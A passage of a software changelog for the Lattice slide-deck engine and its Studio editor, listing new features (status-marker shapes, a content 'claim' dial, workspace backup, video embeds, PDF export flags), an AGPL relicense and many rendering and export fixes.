- **New lint rule `conflicting-variants`** flags a slide carrying two members of one
  mutually-exclusive axis (two tones, two type scales, `with-period` + `no-period`,
  `compact` + `loose`) or two finish selectors — the same rule the drawer's
  single-select controls reflect.
- **Status markers are now a shape system — `stamp:` / `tone:` front-matter
  registers.** Every state marker (`confidential` / `wip` / `draft` / …) and tone
  marker (`tone-pass` / …) renders in a chosen SHAPE, picked once deck-wide and
  overridable per slide. State-marker shapes (`stamp:`): `tab` (default), `notch`,
  `bracket`, `seal`, `pill`, plus a wider range (`ribbon`, `flag`, `underline`,
  `dot`, `mark`, `veil`, `bar`, `pin`). Tone-marker shapes (`tone:`): `rail`
  (default, left), `edge` (top), `glow` (inset ring). The shape is **orthogonal**
  to which marker shows — the marker sets its label/color, the register sets its
  shape — so a deck reads as one family. All marker labels/colors route through
  palette tokens (`--fail`/`--warn`/`--accent`/`--text-muted`), so they stay
  on-brand across themes. Surfaced in the Studio "This slide" drawer as
  provenance-aware "Style" pickers (the boardroom subset first), and validated by
  new `unknown-stamp` / `unknown-tone` deck-lint rules. Vocab:
  `lib/core/resolve-stamp.js`, `lib/core/resolve-tone-style.js`; design:
  `engineering/decisions/2026-07-03-status-marker-style-variants.md`.

- **`claim` — one way to give content the stage.** A universal, purpose-coupled
  dial for how much of the frame the content claims vs the chrome — deck-wide
  (`claim: quiet|hero|bleed` front-matter) or per slide (`claim-quiet` /
  `claim-hero` / `claim-bleed`; `framed` is the default). `quiet` recedes the
  section-dot rail + meta bay (keeps the title + page number); `hero` drops the
  masthead/footer bands (the page number reads through — `no-paginate` removes
  it); `bleed` goes true edge-to-edge. It composes with the existing chrome
  switches (so `claim-hero no-paginate` is expressible — switches, not a rigid
  slider). `claim-quiet`/`claim-hero` are universal; `claim-bleed` is a
  semi-universal opt-out — prose-dense/table layouts (`compare-table`,
  `list-tabular`, `glossary`, `inventory`, and the legal ledgers) exclude it
  because content at the true edge crops, and the deck linter warns
  (`claim-bleed-unsafe`) if used anyway. Chart `cover` is **absorbed** into
  `claim-hero` (a chart at `claim-hero` keeps its title and gains the full-bleed
  caption band cover used to provide). Image's `spotlight`/`statement`/`split`
  are left untouched. Design:
  `engineering/decisions/2026-07-03-claim-content-claims-the-stage.md`.
- **Removed: the chart-only `cover` modifier.** Superseded by the universal
  `claim-hero` (above); `<!-- _class: radar cover -->` becomes
  `<!-- _class: radar claim-hero -->`. Only the radar and piechart demos used
  it. *(Additive for authors overall — `claim-hero` works on every component;
  this line notes the one renamed token.)*
- **The installed app is now the Studio.** Installing Lattice (from any page)
  puts **"Lattice Studio"** on your home screen or dock, launching straight
  into the editor instead of the homepage — docs still open inside the app
  window. New alongside it: an **Install the app** entry in Workspace →
  General (real one-tap install on Android/Chrome; a Share → Add to Home
  Screen instruction card on iPhone), tap-the-icon focuses your already-open
  Studio instead of opening a second copy, and long-pressing the icon offers
  **New deck · Drawing Board · Docs** shortcuts. Existing installs pick up the
  new launch target automatically. See
  `engineering/decisions/2026-07-03-pwa-studio-identity.md`.

- **Studio: back up and restore your whole workspace.** Workspace → General
  gains **Backup & restore**: one `lattice-workspace.zip` holding every deck
  (with readable `.md` copies), version history, chats, settings, and your
  Library — saved themes, components, finishes, and reference docs — restore
  merges and never overwrites (a
  deck that changed since the backup comes back beside it as "(restored)").
  Your OpenRouter connection is deliberately never in the file. A quiet
  "Last backup" line and a rare, earned reminder round it out; Safari tabs
  get one extra sentence about WebKit's 7-day storage rule. See
  `engineering/decisions/2026-07-02-workspace-backup.md`.

- **Resize and collapse the editor and preview panes — Playground + Studio.** The
  editor|preview divider is now live: drag it to any ratio (keyboard: arrow keys on
  the focused divider; double-click resets), or drag past a pane's minimum — or use
  the header collapse button — to collapse that pane into a slim labeled rail with
  one-click restore. The split persists per surface and self-heals stale values;
  collapse lasts for the session. The rail keeps you informed while collapsed (render
  errors on the Playground preview rail; the issues pill on the Studio editor rail),
  Studio's ⌘K palette gains Collapse/Expand/Reset-split commands, and picking a
  component or gallery auto-expands a collapsed preview so a load never renders into
  a hidden pane. Below the tablet breakpoint the existing Edit/Preview tabs remain
  the sole layout control, unchanged. Design record:
  `engineering/decisions/2026-07-02-resizable-editor-preview-panes.md`.

- **The docs site is an installable PWA with an offline cache.** A web-app
  manifest + generated brand icons (`tools/make-pwa-icons.js`) make
  lattice.style installable (app icon, standalone window), and a runtime-caching
  service worker keeps visited pages — docs, Playground, Studio — working
  offline, with a branded fallback page for unvisited routes. Heavy
  downloadables (PDF/PPTX/zip) are never cached; the worker registers on
  production builds only. See `engineering/decisions/2026-07-02-docs-pwa.md`.

- **Studio E2E: committed pixel baselines at all three viewports.** The
  `@visual` specs now compare against committed `toHaveScreenshot` baselines
  (`docs/e2e/visual.spec.ts-snapshots/`) instead of only attaching screenshots
  — the follow-up the experience-gating decision doc (2026-06-28, §"Baseline
  maintenance") deferred until the font environment was pinned. Determinism:
  the `@playwright/test` version pins the browser/rasterizer; the spec blocks
  the Google Fonts fetches and a `stylePath` (`docs/e2e/visual.css`) pins the
  site chrome to DejaVu (identical bytes on the sandbox and the CI runner) —
  the engine render inside the preview iframe keeps its vendored slide fonts,
  untouched. `maxDiffPixelRatio: 0.01` absorbs sub-pixel AA noise only.
  Re-bless deliberately with `npm run test:e2e:bless`, in the same PR as an
  intentional look change — like the slide golden-diff baselines. Verified: six
  consecutive green verification runs locally against the production build;
  the first CI nightly is the runner-parity check (re-bless from its artifact
  if the runner disagrees).

- **Choose your placement-handle style — a new Workspace › General tab.** The finish
  designer's on-canvas handles (wash hotspot, mark, spotlight) now come in two styles,
  picked per workspace: **Familiar** — a raised grab-knob that reads as obviously
  draggable (the default), or **Precision** — a see-through crosshair reticle for exact
  placement. Designers get precision; everyone else gets familiarity. The setting lives
  in a new **General** tab on the Workspace sheet (previously AI/spend/storage only) and
  takes effect live in the designer. Replaces the flat label pill, which had no grab
  affordance on touch. Each handle keeps its name and a ≥44px touch target.

- **Tap a video poster in the Playground preview to play the clip in place.** The
  `video` component's poster now plays the embedded YouTube/Vimeo clip **over the
  preview** instead of opening a new tab — via a parent-hosted player overlay
  (`docs/src/playground/video-overlay.js`), never an iframe inside the slide (which
  HARD RULE #22 bars and the iOS scaled-iframe traps break). The player is built
  from an allow-listed provider template + the parsed video id only (never the raw
  href). Export is unchanged — the static poster still renders in PDF/PPTX; this is
  a live-preview enhancement. See
  `engineering/decisions/2026-07-02-video-overlay-playback.md`.
  - **Now also in the Studio preview, plus TikTok.** The player is a shared
    singleton wired into the Studio's single-slide renderer (which also gains the
    preview link guard, fixing external-link taps blanking that frame on iOS).
    **TikTok** now plays too — resolved at play time via TikTok's CORS-open oEmbed
    (which handles both `/t/…` share short-links and canonical URLs), then embedded
    as its official `player/v1/{id}` iframe. Lightbox polish: dialog semantics,
    fade-in, background-scroll lock, focus handling, and a "Loading…" state for the
    async TikTok resolve.
  - **Instagram plays too — reels, video posts, and IGTV.** Instagram's
    `/{p,reel,tv}/{shortcode}/embed/` page is frameable (no `X-Frame-Options` /
    `frame-ancestors`) and carries the shortcode in the URL, so it embeds
    **synchronously** — no resolve fetch, so it's immune to the iPhone tracking-
    prevention wall that limits TikTok `/t/…` short links. Built from the parsed
    shortcode only (never the raw href), via the universal `/p/{code}/embed/` path.
    Any non-post Instagram URL (a bare profile) still falls back to the plain link.
  - **The lightbox now sizes to the provider's native shape.** YouTube/Vimeo keep
    the 16:9 box; **TikTok and Instagram reels get a tall phone-shaped box** instead
    of being letterboxed into 16:9. Instagram's `/embed/` is a *card* (header +
    video + caption) whose height varies per post, so it's **auto-fit** to the height
    the card reports via `postMessage` (origin-checked to `instagram.com`), falling
    back to the fixed portrait box if that signal doesn't arrive.
  - **Fixed the iOS first-tap glitch — the Playground jumping to Edit.** On iPhone,
    tapping a video poster opened the player but the mobile single-pane view silently
    flipped to the **Edit** tab behind it. Root cause: the Edit/Preview tabs were Radix
    in *automatic* mode, which activates a tab the instant its trigger receives **focus**
    — and opening the player moved focus onto the Edit trigger. The tabs are now
    *manual*-activation (switch only on a real tap/Enter), so focus movement can't change
    panes. Also hardened the lightbox backdrop against the iOS "ghost click" (a
    synthesized click ~300ms after the opening tap): backdrop closes within 400ms of
    opening are ignored, so the opening gesture can't dismiss the player; the close button
    and Escape are unaffected.
- **PDF export: `--raster` and `--embed-source` flags (lattice-emulator, #690).**
  `--raster` prints the PDF as one full-bleed 2× JPEG per page (from the same
  screenshots the PPTX path takes) for maximum viewer compatibility — selectable text is
  lost, so it stays opt-in; speaker notes, `--present`, and `--embed-source`
  still apply to the assembled document. `--embed-source` attaches the deck's
  Markdown source to the PDF as an embedded file (visible in any attachments
  panel, extractable with `pdfdetach`), so the artifact alone round-trips back
  to an editable deck.
- **The Fabricate finish designer's on-canvas placement handles are now LABELED.** The
  drag dots over the specimen (wash hotspot, mark, spotlight) were identical circles —
  you couldn't tell which was which. Each is now a named, tone-colored pill (`Wash` /
  `Mark` / `Spotlight`) centered on its point, so multiple handles read at a glance.
- **Studio E2E — journeys + persona scenarios, with a live-OpenRouter AI tier
  (`docs/e2e/journeys/`, `docs/e2e/scenarios/`, #694).** Two new layers on top
  of the feature-level suite (#691), each asserted on a goal-level oracle
  rather than a presence check: multi-feature journeys (author → Present with
  the last slide's speaker note rendering; author → Share with a real PDF /
  Markdown download, never a silent no-op) and persona scenarios (an exec's
  deck scores board-ready and exports; a consultant's palette swap re-themes
  every slide with zero overflow flags; a presenter traverses the whole deck
  and the dual-screen presenter popup carries the note; a power user's
  fabricated component/theme round-trips into authoring). The AI-assisted tier
  drives the Architect against a **live OpenRouter model** — Rewrite lead,
  chat instruct → Apply diff, and Refine → Shorten must actually change the
  deck source AND save a History checkpoint (plus a moving spend tally, so the
  silent offline floor can never masquerade as success). Gated on the
  `OPEN_ROUTER_KEY` env var (self-skips with a reason when absent) and run as
  a separate keyed job in `studio-e2e-nightly.yml`; cost-bounded by the cheap
  Haiku-latest default, a two-slide deck, and the Studio's own hard-stop
  budget cap. Injection path + guardrails:
  `engineering/decisions/2026-07-02-studio-e2e-scenarios.md`.

- **The landing "Can't install anything?" card captures an email for the
  SlideWright waitlist.** A zero-JS Buttondown form (`WaitlistForm` in
  `landing/sections.tsx`) POSTs to the `latticestyle` list and opens the
  confirmation in a new tab, so browser-only visitors have a real follow
  mechanism instead of a dead end. Closes the last open item from the
  website-positioning decision doc (§8.3).

### Changed

- **Workspace settings collapsed to two tabs — `General · AI`.** The sheet now splits
  cleanly by concern. **General** holds the non-AI workspace prefs — placement-handle
  style + where decks live (deck storage moved out of its own thin tab; the standalone
  **Storage** tab is retired). **AI** folds the former **AI model**, **Spend**, and
  **Instructions** tabs into one tab with three stacked sections — **Model** (the
  Cloud / On-device generation switch + connect), **Spend** (wallet balance, per-key cap,
  session tally, your cap), and **Instructions** (output language, standing voice,
  component-generation prefs) — because spend and instructions are facets of the AI model,
  not separate settings. The trade-off is a longer AI scroll, mitigated by hairline
  section dividers. Replaces the earlier `General · AI model · Spend · Instructions`
  four-tab layout.

- **Breaking: Lattice is relicensed from MIT to AGPL-3.0-only.** The full
  GNU Affero GPL v3 text replaces MIT in `LICENSE`; `package.json` now
  declares `AGPL-3.0-only`. Modified versions that are distributed or offered
  as a network service must publish their source under the same license;
  contact SlideWright for commercial terms. `CONTRIBUTING.md` (new) covers
  the contribution terms. Versions published before this change remain
  MIT. The README, docs-site copy (landing/features/comparison/introduction,
  footers), and the LFM spec's governance section now say AGPL instead of MIT
  (the spec prose itself stays CC-BY-4.0). A red-team pass stamped the dist
  JS/CSS bundles with SPDX + copyright banners and rewrote the
  license-adjacent marketing copy to promise only what the AGPL actually
  permits (everyday rendering is obligation-free; redistributing or serving
  the engine is what triggers copyleft). The licensor is identified
  (Sharmarke Aden dba SlideWright), commercial-license inquiries have a
  contact address, `LICENSE-EXCEPTIONS` (new) grants the Lattice Output
  Exception so the engine CSS/JS embedded in exported HTML decks never
  encumbers a deck author, and `TRADEMARKS.md` (new) reserves the Lattice /
  SlideWright names — forks must rename.

- **The Contributor License Agreement is retired — contributors own their
  work.** Introduced alongside the relicense and removed before a single
  signature was collected: the CLA's core grant (letting SlideWright
  relicense contributions under commercial terms) was one-sided, and that is
  not this project's model. Contributions are accepted plainly under
  AGPL-3.0 (inbound = outbound) with no additional rights granted to anyone;
  `CLA.md` and the `cla.yml` enforcement workflow are deleted and
  `CONTRIBUTING.md` is rewritten around the chosen model — a sole-authored
  core with an author-owned periphery: issues and small DCO-signed fixes
  welcome; substantive engine work by arrangement (paid if it ships in
  anything commercially licensed); themes/plugins/tools belong entirely to
  their authors to license and sell anywhere; and a symmetry pledge that any
  engine capability a commercial SlideWright product monetizes lands in the
  AGPL engine within six months. Analysis and decision:
  `engineering/decisions/2026-07-02-contribution-model.md`.

### Fixed

- **`no-footer` / `silent` now actually hide the running footer on Form decks.**
  The migrated Form frame nests the footer text in `.cell-footer`, and an
  unlayered `display:flex` beat the base `section.no-footer > footer` rule (which
  is in `@layer universal`), so `no-footer` and `silent` silently left the footer
  visible on the default composition — including the Studio's "Hide footer"
  toggle. The suppression now lives in the same unlayered context, scoped to
  `.form` (only the footer text hides; the page number and rail keep their berth
  in the band). Guarded by a real-render computed-style test
  (`test/integration/invariants/chrome-suppression.test.js`).

- **State markers (`confidential` / `wip` / `draft`) no longer vanish on
  masthead-less form layouts** (`quote`, `big-number`). The form status Tile
  suppressed the base band/watermark on the assumption a masthead-bay chip would
  replace it — but those layouts have no bay, so the marker silently disappeared.
  They now fall back to an always-visible top-right corner pill, suppressed (via a
  bare `:has(.masthead-bay)`) only where a bay exists to host the chip.

- **A `tone-*` rail now coexists with state markers AND finishes.** The tone accent
  rail used `section::before` — the same pseudo every state stamp (`confidential`,
  `wip`, …) and `mark-*` decoration owns — so combining a tone with a stamp either
  collapsed the stamp into the 8px rail or (on `form` layouts) erased the rail. The
  rail is now a solid, blur-free inset `box-shadow` on the section (a channel state
  markers don't touch, and one that prints reliably in the vector PDF). On a
  `tone-* finish-*` slide the finish backdrop recedes 8px from the left so the rail
  reads beside the finish instead of being occluded by its wash.

- **The Studio no longer deletes `_focus` / `_build` / `style` directives or
  corrupts fenced code when you edit a speaker note.** The note transform's
  directive classifier had drifted from the engine and silently ate any comment it
  didn't recognize as a directive; its slide splitter and comment scan were
  fence-blind, so a mermaid block's `---` front matter split the slide (changing the
  slide count and destroying the diagram) and a `<!-- … -->` shown inside a code
  fence was read/edited as a note. All per-slide editing now shares one fence-aware,
  span-surgical serializer whose directive vocabulary is generated from the engine
  (drift-gated by a parity test). The slide-rail chip and readiness score also now
  read multi-token `_class` values (e.g. `kpi dark`) instead of falling back to
  `text`.

- **The `video` demo, gallery, and docs pointed at a removed Vimeo clip.** The
  sample Vimeo URL (`vimeo.com/76979871`) had been taken down (404), so the demo
  deck's link/QR, the component gallery, docs, and the `dist` machine-catalog all
  sent viewers to a dead page. Swapped to a live, embeddable, Creative-Commons clip
  (`vimeo.com/1084537`, Big Buck Bunny — verified via oEmbed: embeddable, no domain
  restriction). The committed `examples/video.pdf` and the video gallery PDFs were
  rebuilt; they grow because they were previously (anomalously) stored with SVG
  posters kept as vectors, and the rebuild follows the engine's default of
  rasterizing SVG `<img>`/background images at 2× for PDF portability.

- **Tapping an input in the Studio no longer zooms the page on iOS.** iOS
  Safari auto-zooms when a focused text control computes under 16px; the
  first fix (bumping individual search boxes and the Playground editor)
  didn't survive new surfaces — the Studio shipped its own CodeMirror theme
  (13px) plus a set of dense 12–13.5px fields, and the zoom came back. The
  fix is now structural: a global coarse-pointer net in the shared
  `landing.css` reset forces every text-entry control on every standalone
  page (Studio, Playground, Drawing Board, landing, workbench) to at least
  16px, and the Studio's shared editor theme carries the same
  coarse-pointer bump as the Playground's for the CodeMirror contenteditable
  the net can't reach. A touch-emulating Playwright guard
  (`docs/e2e/ios-zoom.spec.ts`) sweeps every mounted text control on both
  Studio and Playground so a third regression fails in the nightly. Desktop
  keeps the denser sizes.

- **Chart slides no longer export black/unstyled in the Studio image PDF and
  PPTX.** html-to-image inlines computed styles onto HTMLElements only, so a
  nested chart `<svg>`'s clone kept just its classes — fills fell to
  SVG-default black, gradient stops kept raw `var()` (black pentagon/donut),
  the CSS-sized root rescaled via its viewBox, and label font-sizes vanished
  (found exporting the jargon gallery on-device; pre-existing, unmasked once
  large-deck exports stopped crashing). The capture pass now bakes every
  stylesheet-styled chart `<svg>` with `flattenSvgStyles` — the same kernel
  behind "download chart as SVG" — and pins its layout box before
  rasterization; Mermaid/function-plot (self-styled via their own `<style>`
  block) are untouched. One pass covers PDF (both lanes) and PPTX. Regression
  e2e pins the mechanism (baked font-sizes, no raw `var()` stops) and was
  verified to fail on the pre-fix build.
- **Studio/Drawing Board PDF export no longer freezes the page on a large deck.**
  The one-click image PDF's CPU-heavy stages — the per-slide PNG deflate
  (`canvas.toDataURL`), jsPDF's per-image re-encode, and the final document
  serialization — now run in a dedicated worker
  (`docs/src/playground/pdf-export-worker.js`); the main thread only clones and
  draws each slide and transfers the bitmap. Measured on a 36-slide deck (same
  build, worker lane vs the old in-thread lane): total main-thread blocked time
  48.7s → 7.8s (−84%), longest single freeze 1384ms → 376ms, wall time 64s →
  54s — the progress line now paints and the page stays responsive throughout.
  The transfer window is bounded (at most 2 slides in flight), so a long deck
  can't pin hundreds of MB of queued bitmaps — the mid-deck crash on memory-capped
  mobile browsers (observed on-device at ~45 of 61 slides; measured 26 queued
  bitmaps ≈ 382 MB unbounded → 2 ≈ 29 MB bounded, same wall time). Browsers
  without OffscreenCanvas/module workers (and any worker failure) fall back to
  the original in-thread build automatically. Pages stay 2× PNG (lossless) by
  default; a new **Workspace › General "PDF export pages"** preference offers
  **Fast (JPEG q95)** — measured ~2× quicker end-to-end and several-times-smaller
  files, because jsPDF embeds JPEG by direct byte copy instead of re-encoding
  PNG (~1s/page, the pipeline's dominant cost). The fidelity-vs-speed call is
  the user's: lossless remains the default, and the choice applies to Share →
  PDF only (PowerPoint and Print are unaffected).
- **The bare `statement` slide class is retired from shipped content — it was
  never a registered component.** `statement` names a component *bucket*
  (`big-number` · `content` · `quote` · `split-panel`) and the `image statement`
  composition, but no CSS targets a bare `section.statement`, so slides using it
  rendered as an unstyled heading on empty canvas. The two live usages are
  fixed: `examples/adaptive-image.md` slide 2 becomes a `divider` (PDF
  re-rendered — which also gives that deck the #690 raster-twin treatment), and
  the Studio's "add slide" template (`deck-ops.ts` `NEW_SLIDE`) now inserts
  `content`, the generic prose slide, so new Studio slides are styled.

- **Studio "Delete slide" was never broken — it is a two-step in-place confirm,
  and the E2E suite now proves it (#692).** The first click ARMS the rail button
  (it flips to a red "Confirm delete slide" for 3 seconds), the second click
  deletes — a deliberate destructive-op guard shipped with #610. Both the #691
  E2E probe and the manual repro clicked once and misread the armed state as a
  dead button. No product change: the `test.fixme` in
  `docs/e2e/slide-ops.spec.ts` is replaced with a real two-step test (armed
  state asserted, then rail −1 + "Slide deleted." toast), verified green in a
  real browser against the production-built site.
- **PDF export: SVG images are rasterized at export time by default (#690).**
  Chromium prints SVG `<img>`/`background-image` placements into the vector PDF
  as shading-pattern/transparency-group constructs that iOS Quartz viewers
  partially render or drop outright. Each unique SVG now becomes a 2× PNG twin
  (a plain image XObject) swapped in before printing, with each `<img>` pinned
  to its laid-out box so layout is unchanged; text and inline `<svg>` (Mermaid,
  charts, logo marks) stay vector and selectable. Opt out with
  `--keep-vector-images`. See `engineering/gotchas.md` → "SVG images in the
  exported PDF partially render or vanish in iOS Quartz viewers".
- **Tapping an external link in the live preview no longer blanks it on iOS.** A
  slide can carry a real `<a href="https://…">` (the `video` poster links to the
  clip; `contact`/`qr`/`closing` carry live URLs) — genuine, clickable links in the
  exported HTML/PDF. But inside the scaled `srcdoc` preview iframe, iOS Safari
  followed the tap *into the iframe*, navigated it to the external site, which
  frame-blocks → the preview went blank and never returned (desktop opened a new
  tab, so it was invisible). The shared filmstrip builder (`deck-preview.js`,
  Playground + Drawing Board) now injects a preview-only link guard that opens
  `http(s)` link taps in a real top-level tab instead of letting the frame
  navigate; in-page (`#id`), `mailto:`, and `tel:` links are untouched, and the
  exported artifact's link is unchanged.
- **The common quadrant chart fills its slide again instead of rendering as a
  thumbnail.** When charts moved into the Form, `.chart-body` became a
  size-query container, which silently re-based the quadrant SVG's
  slide-relative `max-height: 50cqh` cap to *half the chart-body* — shrinking
  the default/magic/bubble/trail/threshold variants to roughly a third of
  their intended size (the cohort variant, already on the Form-aware sizing,
  was unaffected). The common quadrant now mirrors the pie's proven in-form
  pattern — figure collapsed with `display: contents`, SVG sized
  `height: 100cqh` off the chart-body — so it fills the available body area
  and scales with it. Refreshed quadrant + chart gallery goldens and the
  affected example decks.
- **A saved finish now renders in exported/shared decks — including per-slide.** The
  Markdown and Marp source handoffs inline the referenced saved finishes' generated CSS
  as a global `<style>`, so a shared deck keeps its finish on another machine (and the
  CLI renders it). Previously only a *deck-wide* finish was embedded; a finish applied
  per slide (`_class: … finish-<slug>`) exported blank. The image PDF/PPTX and vector
  Print paths already carry the finish CSS via the render's `extraCss`; combined with
  the per-slide `finish` compositor implication, per-slide finishes now render across
  every export format. No-op for a deck that references no saved finish.
- **Saved (fabricated) finishes are first-class in the Studio editor.** Applying a
  finish you created no longer trips an `unknown-finish` lint warning — your saved
  finish names are folded into the deck-lint's finish register — and the editor now
  completes `finish:` values from the built-in presets **plus** your own saved
  finishes. (Follow-up to #669.)
- **A saved finish is named consistently by its `finish-<slug>` token everywhere in
  the deck.** The `finish-` prefix is what isolates a user finish from the built-in
  register, so it's now the single form the deck carries: `finish: finish-shu` in
  front matter **and** `_class: … finish-shu` on a slide. Autocomplete offers user
  finishes prefixed (built-ins stay bare), **Apply** writes the prefixed token, the
  deck-wide `finish: finish-shu` **renders** (resolved to the saved finish's injected
  CSS + stamped class), and it validates clean (the bare slug is still accepted, so a
  pre-prefix deck doesn't false-warn).
- **The editor's completion + inline lint now refresh the moment a finish is saved.**
  They live in CodeMirror Compartments reconfigured on a vocab change, so a finish you
  just fabricated stops underlining as `unknown-finish` and starts completing
  immediately — no editor remount needed.
- **The Studio deck editor is fully theme-aware (light + dark, AA-safe).** The
  saved-finish lint fold now reaches the editor's *inline* CodeMirror diagnostics
  (not just the Architect panel), so an applied saved finish no longer shows a wavy
  `unknown-finish` underline. The autocomplete dropdown and the text caret are
  palette-tokenized: the completion popup tracks the active theme/mode instead of a
  fixed light chrome, and the native caret takes `--text-body` — the same
  AA-against-`--bg` contract token as the text it marks, so it stays legible in dark
  mode on every theme (accent is a brand color with no such contrast guarantee).
- **`finish:` completes in one more place — the slide-level `_class:` line.** A
  finish also attaches per slide via its prefixed class (`_class: closing finish-brand`),
  so the editor now offers every built-in **and** saved finish as a `finish-<name>`
  token there, on any position in the line — not just as a `finish:` front-matter value.

### Added

- **Backdrop is the finish's FIFTH layer — baked in Fabricate, overridden with one
  `finish-override:` map.** A finish now carries a *backdrop* alongside wash / texture /
  mark / edge, with three composable restraints: **strength** (dim the whole finish),
  **clearance** (recede it behind the content box so the words sit on clean canvas while
  the finish frames the margins), and **spotlight** (the inverse mask — reveal the finish
  in one joystick-placed window and hide it everywhere else). You tune them in the
  Fabricate designer (a fifth layer group, previewed WYSIWYG), and they're emitted into
  the finish's generated CSS as `--fin-backdrop-*` tokens — the mask is a palette-blind
  `var(--bg)` overlay on `.backdrop-mask`, feathered on screen and a HARD edge in export
  (a feathered alpha area-fade grays in the vector PDF), validated in both faces.
  Clearance and spotlight are two shapes of the ONE mask, so they're mutually exclusive;
  strength composes with either. The deck author overrides **any** baked layer — backdrop
  included — through a single nested front-matter map that mirrors the recipe:

  ```yaml
  finish: finish-shu
  finish-override:
    backdrop: { strength: 0.4, clearance: off }
    wash:     { intensity: 5 }
  ```

  `finish-override:` is deep-merged onto the finish's recipe and the CSS regenerated (so
  an override reaches layers a CSS variable can't express, e.g. a wash-type swap), then
  injected into the Studio preview and embedded into every export. Resetting an axis to
  its default (`strength: 1`, `clearance: off`) turns a baked axis back off. Studio-side —
  the bare CLI renders the already-merged embedded CSS.
  (`engineering/decisions/2026-07-01-finish-restraint-controls.md`.)

  **Breaking (unreleased):** this replaces the top-level `backdrop:` front-matter map
  (strength / clearance) that earlier `## Unreleased` work introduced — its render-path
  stamping, its Deck-setup slider/toggle, and its `backdrop-strength-range` /
  `unknown-backdrop-axis` lint are retired. A leftover top-level `backdrop:` block now
  earns one `retired-backdrop-key` migration warning pointing to `finish-override:`.

- **The gallery deck now exercises every component — all 55, in a 115-slide
  tour** (was 87 slides covering 31). Four new narrative modules: the
  evidence-suite charts (funnel, piechart, progress, radar, quadrant, map,
  journey, timeline-list, state-chart, word-cloud), the legal review
  (statute-stack, authority-chain, obligation-matrix, citation-card,
  regulatory-update, redline), the operating plan (math, inventory,
  checklist, pricing, q-and-a, logo-wall), and connect (contact, wifi).
  Every page visually reviewed; pre-existing component render defects the
  new coverage exposed are tracked in #680.

- **New `video` component — a YouTube / Vimeo / TikTok / Instagram clip as a static,
  PDF-safe embed.** Author a video URL as a bare bullet (`- https://youtube.com/watch?v=…`)
  and the slide renders a poster that LINKS to the clip, a play badge, and the provider's
  name — never an iframe (a PDF can't play video, and the engine bars iframes). Two
  compositions: **`companion`** (a claim leads on the left, the clip proves it on the right)
  and **`gallery`** (a contained, matted exhibit). Add the **`qr`** modifier
  (`video companion qr`) for a scannable code to the same URL — a hairline-divided, centered
  channel beside/under the poster; leave it off and the poster is just a clickable link.
  Optional `- <text> `caption`` and `- <path> `poster`` bullets; provider is auto-detected.
  Posters can be auto-fetched at build via `tools/fetch-video-oembed.js`
  (YouTube/Vimeo/TikTok; Instagram needs an author poster), cached so render stays offline.
  See `examples/video.md` and `engineering/decisions/2026-07-02-video-component.md`.
- **The gallery PDF is served on the docs site at `/gallery.pdf`.** The
  committed baseline gallery is staged into the site at build time
  (`docs/scripts/sync-portal.mjs`), and the landing hero and introduction
  link it — "show me a finished deck" is now one click from the fold.

### Changed

- **Website repositioning — the landing, features, comparison, introduction,
  getting-started, and README copy** now lead with deterministic design
  instead of auto-generation language (hero: "Write the *words*. The deck is
  already designed."), per
  `engineering/decisions/2026-07-02-website-copy-positioning.md`. The landing
  gains a three-step how-it-works band, a proof strip with the sourced
  AI-fact-check stat, a "Bring your own model" section for agent workflows,
  and a fourth next-steps card for browser-only visitors; field cards lead
  with project leads and name consultants. Component/bucket/palette counts on
  the landing and features pages are now generated from the manifests at
  build time (they had drifted to three conflicting published numbers);
  hand-written prose says "more than fifty." British spellings on marketing
  surfaces moved to US English (HARD RULE #21; budget ratcheted 1364 → 1351).

### Fixed

- **Getting-started's first-run commands actually run.** They referenced
  `examples/gallery.md` / `examples/gallery-mermaid.md`, which don't exist —
  a newcomer's first command exited with `error: source markdown not found`,
  and the introduction's "See it first" link 404'd. Commands now use the
  bundled `lattice` bin against the real fixture path, the dead
  gallery-mermaid line is gone, and the introduction links the served
  `/gallery.pdf`. README's matching stale paths and its "committed to
  `examples/`" claim are fixed too.

### Added

- **A finish applies to a single slide with one class — `_class: … finish-atrium`.**
  A per-slide `finish-<name>` class (built-in **or** a saved `finish-<slug>`) now implies
  the bare `finish` compositor class in all three render paths, so it activates the
  backdrop on that slide by itself — no deck-wide `finish:` and no second `finish` token
  required. The Studio also injects a saved finish's CSS whenever any slide references it,
  not just when it's the deck-wide value. `finish-none` (the per-slide opt-out) and the
  `finish-preview` specimen are not variants, so they don't activate. (Finishes are now
  applied independently to slides, matching how `_class` modifiers work.)
- **Restrain an overpowering finish — the backdrop layer (#669).**
  A finish now composites onto a dedicated `.backdrop` wrapper behind content (injected across
  all three render paths), so it can be tuned as one layer. Export-safe (a plain `opacity` on
  the wrapper, verified in the vector PDF). Also frees `section::after` for the paginator (the
  mark/edge moved onto the wrapper's pseudos), fixing the contended vignette edges on
  halo/ledger/nimbus/gallery. The layer's controls — strength + clearance — shipped (later in
  this same `## Unreleased`) as a **baked finish layer** tuned in Fabricate and overridden per
  deck via `finish-override:`, superseding this entry's original deck-level `backdrop:` front
  matter / Deck-setup dial. See `engineering/decisions/2026-07-01-finish-restraint-controls.md`.

- **Ground one AI generation in several reference docs at once (#656).** The reference-doc
  picker is now multi-select — toggle any number of saved docs (up to a cap) into the grounding
  set for a theme/component/deck-chat generation, e.g. brand guide + tone-of-voice + last
  quarter's deck together. Each active doc shows as a removable chip with a combined "N docs ·
  billed each run" note; the pre-send budget estimate sums across them. Under the hood
  `groundMessages` inlines the text docs as filename-labeled blocks under one untrusted-data
  preamble and attaches each PDF as its own file part — the #22 threat model is unchanged (every
  doc is framed as data; generated HTML still crosses the sanitizer).

- **`debug:` front matter turns on the layout debug overlay in every authoring
  preview.** Set `debug: on-hover` (deck-wide) or `<!-- _debug -->` (one slide) and the
  Playground, Drawing Board, and Studio previews outline each box by its **layout
  mode** — grid (blue), flex (vermillion), flow (grey), an Okabe-Ito CVD-safe palette
  that clears WCAG-AA over both preview backgrounds — and label the structural boxes
  (the slide, grid/flex containers, grid cells) with a configurable set of levers:
  `identity · layout · size` by default, plus opt-in `class` and `box` (add `verbose`
  to show everything). Labels default to **hover reveal** (`debug: on-hover`): at rest
  you see only the color-coded outlines, and hovering a box (desktop) or **pressing and
  holding** it (touch) reveals its label — and its container chain — so
  a dense grid never becomes a wall of chips (`debug: on-always` pins every chip on at
  once for a static map). On touch it's **press-and-hold to peek** (lift to hide),
  driven by a capture layer in the parent page rather than inside the iframe — iOS
  Safari won't deliver a touch into a scaled iframe — so it works on iPhone. Labels ride
  in a `pointer-events:none` overlay with **zero layout impact**, de-overlapped so a
  container and its first cell don't collide. **Off is the
  default** — with no `debug:` key (or `debug: off`) the preview is clean. It is
